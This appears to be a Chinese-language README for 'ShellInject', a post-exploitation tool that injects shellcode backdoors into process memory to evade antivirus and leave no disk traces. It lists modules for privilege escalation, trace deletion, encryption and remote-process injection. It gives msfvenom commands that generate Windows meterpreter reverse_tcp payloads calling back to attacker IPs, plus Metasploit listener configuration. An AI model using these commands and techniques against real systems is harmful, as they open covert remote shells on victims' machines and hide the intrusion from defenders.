# Shellinject


<br>

<div align=center>
  
![logo](https://user-images.githubusercontent.com/52789403/185021479-1816c5bc-2ad4-4d54-beca-08ba5e3b3253.png)

<br>

[![Build status](https://cdn.lyshark.com/archive/LyScript/build.svg)](https://github.com/lyshark/PeView) [![Crowdin](https://cdn.lyshark.com/archive/LyScript/email.svg)](mailto:me@lyshark.com)  [![Download x64dbg](https://cdn.lyshark.com/archive/lydebug/download.svg)](https://github.com/lyshark/lydebug/releases) 

</div>

<br>
<b>版本：1.0</b>
<br>
<b>发布日期：2021-07-05 07:25</b>
<br><br>

ShellInject 是一款通用的ShellCode后门注入器，该工具主要用于在后渗透阶段使用，工具可将后门直接注入到特定进程内存中而不会在磁盘中留下任何痕迹，注入成功后Metasploit即可获取控制权，只要对端不关机则权限会维持，由于内存注入无对应磁盘文件，所以也不会触发杀软报毒。

主要模块与功能:

 - 1.显示可注入进程
 - 2.提升自身权限
 - 3.删除自身痕迹
 - 4.字节数组格式化
 - 5.字节数组格式化
 - 6.文本压缩后异或
 - 7.字符串转为字节数组
 - 8.字节数组加密/解密
 - 9.注入字符串到自身
 - 10.注入字节数组到自身
 - 11.从文件中读入字符串并注入运行
 - 12.注入字符串到远程进程并运行
 - 13.从远程加载字符串并注入自身进程
 - 14.从文件读入加密字符串并执行反弹
 - 15.注入加密后的字符串到远程进程中

首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
```C
32位载荷生成
[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.116 LPORT=9999 -f c

64位载荷生成
[root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```
后台侦听器的配置也分为32位与64位，使用时需要与载荷的位数相对应。
```C
32位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 192.168.1.116
msf6 > set lport 9999

64位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
```
